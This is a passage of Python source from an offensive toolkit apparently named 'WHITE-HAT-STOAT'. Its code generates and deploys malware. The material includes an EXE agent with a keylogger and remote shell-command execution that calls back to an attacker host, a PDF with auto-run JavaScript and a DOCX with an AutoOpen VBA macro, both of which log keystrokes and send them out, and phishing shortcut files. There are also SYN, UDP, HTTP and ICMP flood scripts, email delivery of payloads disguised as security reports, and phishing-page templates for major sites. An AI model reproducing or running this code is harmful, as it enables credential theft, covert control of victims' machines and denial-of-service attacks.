    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_payloads'] = self.conn.execute("SELECT COUNT(*) FROM payloads").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_scans'] = self.conn.execute("SELECT COUNT(*) FROM scans").fetchone()[0]
        except:
            pass
        return stats
    
    def log_message(self, platform: str, sender: str, message: str, response: str, command: str = None):
        try:
            self.conn.execute(
                """INSERT INTO platform_messages (platform, sender, message, response, command)
                   VALUES (?, ?, ?, ?, ?)""",
                (platform, sender, message[:500], response[:1000], command[:200] if command else None)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log message: {e}")
    
    def save_payload(self, payload: Payload) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO payloads 
                   (id, name, payload_type, file_path, created_at, deployed, deployment_count, callback_host, callback_port)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (payload.id, payload.name, payload.payload_type, payload.file_path,
                 payload.created_at, payload.deployed, payload.deployment_count,
                 payload.callback_host, payload.callback_port)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save payload: {e}")
            return False
    
    def get_payloads(self, payload_type: str = None) -> List[Dict]:
        try:
            if payload_type:
                rows = self.conn.execute("SELECT * FROM payloads WHERE payload_type = ? ORDER BY created_at DESC", (payload_type,))
            else:
                rows = self.conn.execute("SELECT * FROM payloads ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def register_agent(self, agent_id: str, name: str, hostname: str, ip: str, os_info: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO agents (id, name, hostname, ip_address, os_info, last_seen, status)
                   VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP, 'online')""",
                (agent_id, name, hostname, ip, os_info)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_agents(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM agents ORDER BY last_seen DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def verify_user(self, username: str, password: str) -> Optional[Dict]:
        try:
            import hashlib
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            row = self.conn.execute(
                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def create_session(self, user_id: int) -> str:
        try:
            session_id = secrets.token_urlsafe(32)
            expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
            self.conn.execute(
                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
                (session_id, user_id, expires_at.isoformat())
            )
            self.conn.commit()
            return session_id
        except:
            return None
    
    def verify_session(self, session_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                """SELECT s.*, u.username, u.role 
                   FROM sessions s 
                   JOIN users u ON s.user_id = u.id 
                   WHERE s.id = ? AND s.expires_at > datetime('now')""",
                (session_id,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def close(self):
        try:
            self.conn.close()
        except:
            pass

# =====================
# PAYLOAD GENERATOR MODULE
# =====================
class PayloadGenerator:
    """Generate and deploy payloads (EXE, PDF, DOCX, Link, Network)"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.callback_host = config.get('payload.default_callback', 'localhost')
        self.callback_port = config.get('payload.default_port', 4444)
    
    def generate_exe(self, name: str, callback_host: str = None, callback_port: int = None) -> Payload:
        """Generate an EXE payload with keylogger functionality"""
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        payload_id = str(uuid.uuid4())[:8]
        file_name = f"{name}_{payload_id}.exe"
        file_path = os.path.join(EXE_PAYLOADS_DIR, file_name)
        
        # Generate the EXE payload with keylogger
        template = self._get_exe_template()
        template = template.replace("{CALLBACK_HOST}", callback_host)
        template = template.replace("{CALLBACK_PORT}", str(callback_port))
        template = template.replace("{PAYLOAD_ID}", payload_id)
        
        # Write template to file
        with open(file_path, 'w') as f:
            f.write(template)
        
        # Build with PyInstaller if available
        if PYINSTALLER_AVAILABLE:
            try:
                subprocess.run([
                    'pyinstaller', '--onefile', '--noconsole', '--name', file_name.replace('.exe', ''),
                    '--distpath', EXE_PAYLOADS_DIR, '--workpath', TEMP_DIR, file_path
                ], capture_output=True, timeout=60)
                exe_file = os.path.join(EXE_PAYLOADS_DIR, file_name.replace('.exe', ''), file_name)
                if os.path.exists(exe_file):
                    shutil.move(exe_file, file_path)
                    shutil.rmtree(os.path.join(EXE_PAYLOADS_DIR, file_name.replace('.exe', '')))
            except:
                pass
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="exe",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        self.db.save_payload(payload)
        return payload
    
    def generate_pdf(self, name: str, callback_host: str = None, callback_port: int = None) -> Payload:
        """Generate a PDF payload with JavaScript keylogger"""
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        payload_id = str(uuid.uuid4())[:8]
        file_name = f"{name}_{payload_id}.pdf"
        file_path = os.path.join(PDF_PAYLOADS_DIR, file_name)
        
        # Generate PDF with embedded JavaScript keylogger
        pdf_content = self._get_pdf_template()
        pdf_content = pdf_content.replace("{CALLBACK_HOST}", callback_host)
        pdf_content = pdf_content.replace("{CALLBACK_PORT}", str(callback_port))
        pdf_content = pdf_content.replace("{PAYLOAD_ID}", payload_id)
        
        with open(file_path, 'w') as f:
            f.write(pdf_content)
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="pdf",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        self.db.save_payload(payload)
        return payload
    
    def generate_docx(self, name: str, callback_host: str = None, callback_port: int = None) -> Payload:
        """Generate a DOCX payload with VBA macro keylogger"""
        callback_host = callback_host or self.callback_host
        callback_port = callback_port or self.callback_port
        
        payload_id = str(uuid.uuid4())[:8]
        file_name = f"{name}_{payload_id}.docx"
        file_path = os.path.join(DOCX_PAYLOADS_DIR, file_name)
        
        if DOCX_AVAILABLE:
            # Create DOCX with macro instructions
            doc = Document()
            doc.add_heading('WHITE-HAT-STOAT Security Report', 0)
            doc.add_paragraph('Please enable macros to view this document properly.')
            doc.add_paragraph('')
            doc.add_paragraph('Security vulnerabilities found in your organization:')
            doc.add_paragraph('')
            
            # Add VBA macro code
            macro_code = self._get_vba_template()
            macro_code = macro_code.replace("{CALLBACK_HOST}", callback_host)
            macro_code = macro_code.replace("{CALLBACK_PORT}", str(callback_port))
            macro_code = macro_code.replace("{PAYLOAD_ID}", payload_id)
            doc.add_paragraph('=' * 50)
            doc.add_paragraph('VBA Macro Code:')
            doc.add_paragraph(macro_code)
            
            doc.save(file_path)
        else:
            # Fallback to simple text file
            with open(file_path, 'w') as f:
                f.write(f"WHITE-HAT-STOAT DOCX Payload\nCallback: {callback_host}:{callback_port}\n")
                f.write(self._get_vba_template())
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="docx",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=callback_host,
            callback_port=callback_port
        )
        
        self.db.save_payload(payload)
        return payload
    
    def generate_link(self, name: str, url: str = None) -> Payload:
        """Generate a link payload (phishing URL)"""
        payload_id = str(uuid.uuid4())[:8]
        file_name = f"{name}_{payload_id}.url"
        file_path = os.path.join(LINK_PAYLOADS_DIR, file_name)
        
        if not url:
            url = f"http://{self.callback_host}:{self.callback_port}/payload/{payload_id}"
        
        link_content = f"""[InternetShortcut]
URL={url}
IconFile=shell32.dll,1
IconIndex=1
HotKey=0
"""
        
        with open(file_path, 'w') as f:
            f.write(link_content)
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="link",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=self.callback_host,
            callback_port=self.callback_port
        )
        
        self.db.save_payload(payload)
        return payload
    
    def generate_network_payload(self, name: str, target_ip: str, target_port: int = 80,
                                 attack_type: str = "syn") -> Payload:
        """Generate a network payload (traffic generator script)"""
        payload_id = str(uuid.uuid4())[:8]
        file_name = f"{name}_{payload_id}.py"
        file_path = os.path.join(NETWORK_PAYLOADS_DIR, file_name)
        
        template = self._get_network_template()
        template = template.replace("{TARGET_IP}", target_ip)
        template = template.replace("{TARGET_PORT}", str(target_port))
        template = template.replace("{ATTACK_TYPE}", attack_type)
        template = template.replace("{CALLBACK_HOST}", self.callback_host)
        template = template.replace("{CALLBACK_PORT}", str(self.callback_port))
        template = template.replace("{PAYLOAD_ID}", payload_id)
        
        with open(file_path, 'w') as f:
            f.write(template)
        
        payload = Payload(
            id=payload_id,
            name=name,
            payload_type="network",
            file_path=file_path,
            created_at=datetime.datetime.now().isoformat(),
            callback_host=self.callback_host,
            callback_port=self.callback_port
        )
        
        self.db.save_payload(payload)
        return payload
    
    def deploy_payload(self, payload_id: str, deployment_type: str, target: str = None) -> Dict:
        """Deploy a payload to a target"""
        payloads = self.db.get_payloads()
        payload = next((p for p in payloads if p['id'] == payload_id), None)
        
        if not payload:
            return {'success': False, 'error': f'Payload {payload_id} not found'}
        
        file_path = payload['file_path']
        if not os.path.exists(file_path):
            return {'success': False, 'error': f'Payload file not found: {file_path}'}
        
        # Deploy based on type
        if deployment_type == "email":
            return self._deploy_email(file_path, target, payload)
        elif deployment_type == "link":
            return self._deploy_link(file_path, target, payload)
        elif deployment_type == "download":
            return self._deploy_download(file_path, target, payload)
        elif deployment_type == "network":
            return self._deploy_network(file_path, target, payload)
        else:
            return {'success': False, 'error': f'Unknown deployment type: {deployment_type}'}
    
    def _deploy_email(self, file_path: str, target: str, payload: Dict) -> Dict:
        """Deploy payload via email"""
        if not target:
            return {'success': False, 'error': 'Target email required'}
        
        try:
            # Send email with attachment
            msg = email.message.EmailMessage()
            msg['Subject'] = f"WHITE-HAT-STOAT Security Report - {payload['name']}"
            msg['From'] = "security@white-hat-stoat.local"
            msg['To'] = target
            msg.set_content("Please review the attached security report for your organization.")
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
                file_name = os.path.basename(file_path)
                msg.add_attachment(file_data, maintype='application', 
                                  subtype='octet-stream', filename=file_name)
            
            # Send via SMTP
            smtp = smtplib.SMTP('localhost', 25)
            smtp.send_message(msg)
            smtp.quit()
            
            self.db.conn.execute(
                "INSERT INTO payload_deployments (payload_id, deployment_type, target, status) VALUES (?, ?, ?, ?)",
                (payload['id'], 'email', target, 'sent')
            )
            self.db.conn.commit()
            return {'success': True, 'message': f'Payload sent to {target} via email'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _deploy_link(self, file_path: str, target: str, payload: Dict) -> Dict:
        """Deploy payload via link"""
        if not target:
            return {'success': False, 'error': 'Target URL required'}
        
        try:
            # Upload file to target URL (simulated)
            with open(file_path, 'rb') as f:
                files = {'file': (os.path.basename(file_path), f)}
                response = requests.post(target, files=files, timeout=30)
            
            self.db.conn.execute(
                "INSERT INTO payload_deployments (payload_id, deployment_type, target, status) VALUES (?, ?, ?, ?)",
                (payload['id'], 'link', target, 'success' if response.status_code == 200 else 'failed')
            )
            self.db.conn.commit()
            return {'success': response.status_code == 200, 
                   'message': f'Payload uploaded to {target}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _deploy_download(self, file_path: str, target: str, payload: Dict) -> Dict:
        """Deploy payload for download"""
        if not target:
            return {'success': False, 'error': 'Target download URL required'}
        
        try:
            file_name = os.path.basename(file_path)
            download_url = f"{target}/download/{file_name}"
            
            self.db.conn.execute(
                "INSERT INTO payload_deployments (payload_id, deployment_type, target, status) VALUES (?, ?, ?, ?)",
                (payload['id'], 'download', download_url, 'ready')
            )
            self.db.conn.commit()
            return {'success': True, 'message': f'Payload available at {download_url}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _deploy_network(self, file_path: str, target: str, payload: Dict) -> Dict:
        """Deploy network payload"""
        if not target:
            return {'success': False, 'error': 'Target IP required'}
        
        try:
            # Execute network payload
            subprocess.Popen(['python', file_path, target], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.db.conn.execute(
                "INSERT INTO payload_deployments (payload_id, deployment_type, target, status) VALUES (?, ?, ?, ?)",
                (payload['id'], 'network', target, 'executed')
            )
            self.db.conn.commit()
            return {'success': True, 'message': f'Network payload deployed to {target}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_exe_template(self) -> str:
        """Get EXE payload template with keylogger"""
        return '''#!/usr/bin/env python3
"""
WHITE-HAT-STOAT Agent Payload - EXE Version
Payload ID: {PAYLOAD_ID}
Callback: {CALLBACK_HOST}:{CALLBACK_PORT}
"""

import socket
import subprocess
import sys
import time
import os
import json
import platform
import uuid
import threading
import requests
import queue
import datetime

# Keylogger imports (if available)
try:
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
except ImportError:
    KEYLOGGER_AVAILABLE = False

# Configuration
CALLBACK_HOST = "{CALLBACK_HOST}"
CALLBACK_PORT = {CALLBACK_PORT}
AGENT_ID = str(uuid.uuid4())[:8]
PAYLOAD_ID = "{PAYLOAD_ID}"

# Keylogger state
keylog_queue = queue.Queue()
keylog_running = False
keylog_text = ""

def get_system_info():
    return {{
        "agent_id": AGENT_ID,
        "payload_id": PAYLOAD_ID,
        "hostname": socket.gethostname(),
        "os": platform.system() + " " + platform.release(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
        "pid": os.getpid(),
        "keylogger": KEYLOGGER_AVAILABLE
    }}

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return {{
            "success": result.returncode == 0,
            "output": result.stdout if result.stdout else result.stderr,
            "exit_code": result.returncode
        }}
    except Exception as e:
        return {{"success": False, "output": str(e), "exit_code": -1}}

def keylogger_thread():
    global keylog_text, keylog_running
    
    def on_press(key):
        global keylog_text
        try:
            if key == keyboard.Key.f10:
                return False
            if key == keyboard.Key.enter:
                keylog_text += "\\n"
            elif key == keyboard.Key.tab:
                keylog_text += "\\t"
            elif key == keyboard.Key.space:
                keylog_text += " "
            elif key == keyboard.Key.backspace and len(keylog_text) > 0:
                keylog_text = keylog_text[:-1]
            else:
                try:
                    char = str(key).strip("'")
                    if len(char) == 1:
                        keylog_text += char
                except:
                    pass
        except:
            pass
    
    with keyboard.Listener(on_press=on_press) as listener:
        keylog_running = True
        listener.join()
        keylog_running = False

def send_keylog():
    global keylog_text
    if keylog_text.strip():
        try:
            data = {{
                "type": "keylog",
                "agent_id": AGENT_ID,
                "text": keylog_text,
                "timestamp": datetime.datetime.now().isoformat()
            }}
            requests.post(f"http://{CALLBACK_HOST}:{CALLBACK_PORT}/keylog", 
                         json=data, timeout=10)
            keylog_text = ""
        except:
            pass

def connect_to_server():
    try:
        # Register with server
        response = requests.post(f"http://{CALLBACK_HOST}:{CALLBACK_PORT}/agent/register", 
                               json=get_system_info(), timeout=10)
        return response
    except Exception as e:
        print(f"Connection error: {{e}}")
        return None

def main():
    print(f"WHITE-HAT-STOAT Agent {{AGENT_ID}} connecting to {{CALLBACK_HOST}}:{{CALLBACK_PORT}}")
    
    # Start keylogger if available
    if KEYLOGGER_AVAILABLE:
        keylog_thread = threading.Thread(target=keylogger_thread, daemon=True)
        keylog_thread.start()
        print("Keylogger started (press F10 to stop)")
    
    # Register with server
    server = connect_to_server()
    if not server:
        print("Failed to connect to server")
        return
    
    # Main loop
    while True:
        try:
            # Check for commands
            response = requests.get(f"http://{CALLBACK_HOST}:{CALLBACK_PORT}/agent/command/{AGENT_ID}", timeout=30)
            if response.status_code == 200:
                command = response.json()
                if command.get('cmd'):
                    result = execute_command(command['cmd'])
                    requests.post(f"http://{CALLBACK_HOST}:{CALLBACK_PORT}/agent/result/{AGENT_ID}", 
                                json=result, timeout=30)
            
            # Send keylog
            if KEYLOGGER_AVAILABLE:
                send_keylog()
            
            time.sleep(5)
        except Exception as e:
            print(f"Error: {{e}}")
            time.sleep(5)

if __name__ == "__main__":
    main()
'''
    
    def _get_pdf_template(self) -> str:
        """Get PDF payload template with JavaScript keylogger"""
        return '''%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [4 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS (
  var app = this;
  var host = "{CALLBACK_HOST}";
  var port = {CALLBACK_PORT};
  var agent_id = "{PAYLOAD_ID}" + app.calculateNow().toString();
  
  // Keylogger function
  function startKeylogger() {{
    var keylog = "";
    app.addEventListener("keyDown", function(e) {{
      var key = e.key;
      if (key === "Enter") keylog += "\\n";
      else if (key === "Tab") keylog += "\\t";
      else if (key === "Space") keylog += " ";
      else if (key.length === 1) keylog += key;
    }});
    
    // Send keylog every 30 seconds
    app.setInterval(function() {{
      if (keylog.length > 0) {{
        try {{
          var xmlhttp = new XMLHttpRequest();
          var url = "http://" + host + ":" + port + "/pdf/keylog/" + agent_id;
          xmlhttp.open("POST", url, false);
          xmlhttp.setRequestHeader("Content-Type", "application/json");
          xmlhttp.send(JSON.stringify({{text: keylog, agent: agent_id}}));
          keylog = "";
        }} catch(e) {{}}
      }}
    }}, 30000);
  }}
  
  startKeylogger();
) >>
endobj
4 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 5 0 R >>
endobj
5 0 obj
<< /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (WHITE-HAT-STOAT Security) Tj ET
endstream
endobj
xref
0 6
trailer << /Root 1 0 R >>
%%EOF
'''
    
    def _get_vba_template(self) -> str:
        """Get VBA macro template for DOCX with keylogger"""
        return '''
' WHITE-HAT-STOAT VBA Macro - Keylogger Payload
' Payload ID: {PAYLOAD_ID}
' Callback: {CALLBACK_HOST}:{CALLBACK_PORT}

Private Declare PtrSafe Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare PtrSafe Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer

Dim keylog As String
Dim lastKeys As String
Dim timerRunning As Boolean

Sub AutoOpen()
    Call StartKeylogger
End Sub

Sub Document_Open()
    Call StartKeylogger
End Sub

Sub StartKeylogger()
    On Error Resume Next
    keylog = ""
    timerRunning = True
    
    ' Start keylog timer
    Application.OnTime Now + TimeValue("00:00:10"), "SendKeylog"
    
    ' Keylog loop
    Do While timerRunning
        For i = 48 To 90 ' 0-9, A-Z
            If GetAsyncKeyState(i) And 1 Then
                keylog = keylog & Chr(i)
            End If
        Next i
        
        ' Special keys
        If GetAsyncKeyState(13) And 1 Then keylog = keylog & vbNewLine
        If GetAsyncKeyState(9) And 1 Then keylog = keylog & vbTab
        If GetAsyncKeyState(32) And 1 Then keylog = keylog & " "
        If GetAsyncKeyState(8) And 1 And Len(keylog) > 0 Then keylog = Left(keylog, Len(keylog) - 1)
        
        DoEvents
        Application.Wait (Now + TimeValue("00:00:00.1"))
    Loop
End Sub

Sub SendKeylog()
    On Error Resume Next
    If Len(keylog) > 0 Then
        Dim objXMLHTTP
        Dim payload
        Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
        
        payload = "{{""text"":""" & keylog & """,""agent"":""{PAYLOAD_ID}""}}"
        
        objXMLHTTP.Open "POST", "http://{CALLBACK_HOST}:{CALLBACK_PORT}/docx/keylog", False
        objXMLHTTP.setRequestHeader "Content-Type", "application/json"
        objXMLHTTP.Send payload
        
        keylog = ""
    End If
    
    ' Schedule next send
    If timerRunning Then
        Application.OnTime Now + TimeValue("00:00:05"), "SendKeylog"
    End If
End Sub

Sub StopKeylogger()
    timerRunning = False
End Sub
'''
    
    def _get_network_template(self) -> str:
        """Get network payload template"""
        return '''#!/usr/bin/env python3
"""
WHITE-HAT-STOAT Network Payload
Payload ID: {PAYLOAD_ID}
Target: {TARGET_IP}:{TARGET_PORT}
Attack Type: {ATTACK_TYPE}
Callback: {CALLBACK_HOST}:{CALLBACK_PORT}
"""

import socket
import time
import sys
import random
import threading
import requests
import subprocess
import os
import json
import uuid

# Configuration
TARGET_IP = "{TARGET_IP}"
TARGET_PORT = {TARGET_PORT}
ATTACK_TYPE = "{ATTACK_TYPE}"
CALLBACK_HOST = "{CALLBACK_HOST}"
CALLBACK_PORT = {CALLBACK_PORT}
PAYLOAD_ID = "{PAYLOAD_ID}"
AGENT_ID = str(uuid.uuid4())[:8]

def syn_flood(target, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((target, port))
            sock.close()
        except:
            pass

def udp_flood(target, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(os.urandom(1024), (target, port))
            sock.close()
        except:
            pass

def http_flood(target, port):
    while True:
        try:
            import http.client
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={{"User-Agent": "WHITE-HAT-STOAT"}})
            conn.getresponse()
            conn.close()
        except:
            pass

def icmp_flood(target, port):
    while True:
        try:
            import subprocess
            subprocess.run(['ping', '-c', '1', target], capture_output=True, timeout=1)
        except:
            pass

def main():
    # Register with server
    try:
        requests.post(f"http://{CALLBACK_HOST}:{CALLBACK_PORT}/network/register", 
                     json={{"agent_id": AGENT_ID, "target": TARGET_IP, "type": ATTACK_TYPE}}, timeout=5)
    except:
        pass
    
    # Launch attack
    print(f"Starting {ATTACK_TYPE} attack on {TARGET_IP}:{TARGET_PORT}")
    
    attack_funcs = {{
        "syn": syn_flood,
        "udp": udp_flood,
        "http": http_flood,
        "icmp": icmp_flood
    }}
    
    attack_func = attack_funcs.get(ATTACK_TYPE, syn_flood)
    
    # Start attack threads
    threads = []
    for i in range(50):
        t = threading.Thread(target=attack_func, args=(TARGET_IP, TARGET_PORT), daemon=True)
        t.start()
        threads.append(t)
    
    # Keep running
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("Stopping attack...")

if __name__ == "__main__":
    main()
'''
    
    def list_payloads(self, payload_type: str = None) -> List[Dict]:
        return self.db.get_payloads(payload_type)

# =====================
# KEYLOGGER MODULE
# =====================
class KeyloggerModule:
    """Advanced keylogger with POST to server and F10 activation"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.text = ""
        self.running = False
        self.listener = None
        self.thread = None
        self.last_log_time = time.time()
        self.session_id = str(uuid.uuid4())[:8]
        self.server_ip = self._get_local_ip()
        self.port = self.config.get('keylogger_port', 4444)
        self.interval = self.config.get('keylogger_interval', 30)
        self.server_running = False
        self.server_thread = None
        self.payload_deployed = False
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def start_keylogger(self):
        """Start the keylogger (activated by F10)"""
        if not KEYLOGGER_AVAILABLE:
            print(f"{Colors.ERROR}❌ Keylogger not available (pynput required){Colors.RESET}")
            return
        
        if self.running:
            print(f"{Colors.WARNING}⚠️ Keylogger is already running{Colors.RESET}")
            return
        
        print(f"{Colors.SUCCESS}⌨️ Keylogger started! F10 to stop...{Colors.RESET}")
        self.running = True
        self.text = ""
        
        # Start the keylogger thread
        self.thread = threading.Thread(target=self._run_keylogger, daemon=True)
        self.thread.start()
        
        # Start the POST server
        self._start_server()
    
    def _run_keylogger(self):
        """Run the keylogger in a separate thread"""
        def on_press(key):
            if not self.running:
                return False
            
            try:
                if key == keyboard.Key.f10:
                    print(f"{Colors.WARNING}🛑 Keylogger stopped by F10{Colors.RESET}")
                    self.stop_keylogger()
                    return False
                
                # Handle special keys
                if key == keyboard.Key.enter:
                    self.text += "\n"
                elif key == keyboard.Key.tab:
                    self.text += "\t"
                elif key == keyboard.Key.space:
                    self.text += " "
                elif key == keyboard.Key.backspace and len(self.text) > 0:
                    self.text = self.text[:-1]
                elif key == keyboard.Key.shift or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                    pass
                elif key == keyboard.Key.esc:
                    pass
                else:
                    # Convert key to character if possible
                    try:
                        char = str(key).strip("'")
                        if len(char) == 1:
                            self.text += char
                    except:
                        pass
            except Exception as e:
                print(f"Keylogger error: {e}")
            
            # Send POST request periodically
            if time.time() - self.last_log_time >= self.interval:
                self._send_post()
                self.last_log_time = time.time()
        
        with keyboard.Listener(on_press=on_press) as listener:
            self.listener = listener
            listener.join()
    
    def _start_server(self):
        """Start the keylogger POST server"""
        if self.server_running:
            return
        
        def server_thread():
            try:
                server = HTTPServer(('0.0.0.0', self.port), KeylogHandler)
                server.allow_reuse_address = True
                print(f"{Colors.SUCCESS}✅ Keylogger server listening on port {self.port}{Colors.RESET}")
                self.server_running = True
                server.serve_forever()
            except Exception as e:
                print(f"{Colors.ERROR}❌ Keylogger server error: {e}{Colors.RESET}")
        
        self.server_thread = threading.Thread(target=server_thread, daemon=True)
        self.server_thread.start()
    
    def _send_post(self):
        """Send the logged text via POST request"""
        if not self.text.strip():
            return
        
        try:
            payload = {
                "text": self.text,
                "session": self.session_id,
                "timestamp": datetime.datetime.now().isoformat(),
                "hostname": socket.gethostname()
            }
            
            url = f"http://{self.server_ip}:{self.port}/"
            response = requests.post(url, json=payload, timeout=5)
            
            if response.status_code == 200:
                print(f"{Colors.GREEN}✅ Keylog sent: {len(self.text)} chars{Colors.RESET}")
                # Log to database
                self.db.log_keylog(self.text, self.session_id, "keylogger", socket.gethostname())
                self.text = ""
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed to send keylog: {e}{Colors.RESET}")
    
    def stop_keylogger(self):
        """Stop the keylogger"""
        if self.listener:
            self.listener.stop()
        self.running = False
        print(f"{Colors.WARNING}🛑 Keylogger stopped{Colors.RESET}")
    
    def get_logs(self, limit: int = 100) -> List[Dict]:
        """Get keylogger logs from database"""
        return self.db.get_keylogs(limit)

class KeylogHandler(BaseHTTPRequestHandler):
    """HTTP handler for keylogger POST requests"""
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = json.loads(post_data)
            print(f"\n{Colors.WARNING}📝 KEYLOG RECEIVED:{Colors.RESET}")
            print(f"{Colors.WHITE}  Session: {data.get('session', 'unknown')}{Colors.RESET}")
            print(f"{Colors.WHITE}  Host: {data.get('hostname', 'unknown')}{Colors.RESET}")
            print(f"{Colors.WHITE}  Time: {data.get('timestamp', 'unknown')}{Colors.RESET}")
            print(f"{Colors.WHITE}  Text: {data.get('text', '')[:200]}{Colors.RESET}\n")
            
            # Save to database
            db = DatabaseManager()
            db.log_keylog(data.get('text', ''), data.get('session'), data.get('hostname'), data.get('hostname'))
            db.close()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "ok"}')
        except Exception as e:
            self.send_response(500)
            self.end_headers()

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = None
        self.active_links = {}
        self.phishing_templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        """Load phishing page templates"""
        return {
            'facebook': self._facebook_template,
            'instagram': self._instagram_template,
            'twitter': self._twitter_template,
            'gmail': self._gmail_template,
            'linkedin': self._linkedin_template,
            'github': self._github_template,
            'microsoft': self._microsoft_template,
            'apple': self._apple_template,
            'amazon': self._amazon_template,
            'paypal': self._paypal_template,
            'custom': self._custom_template
        }
    
    def generate_phishing_link(self, platform: str) -> Dict:
        link_id = str(uuid.uuid4())[:8]
        template_func = self.phishing_templates.get(platform, self._custom_template)
        html = template_func()
        
        link = PhishingLink(
            id=link_id,
            platform=platform,
            phishing_url=f"http://localhost:8080",
            template=platform,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        self.phishing_server = PhishingServer(self.db)
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    
    def stop_server(self):
        if self.phishing_server:
            self.phishing_server.stop()
            self.phishing_server = None
    
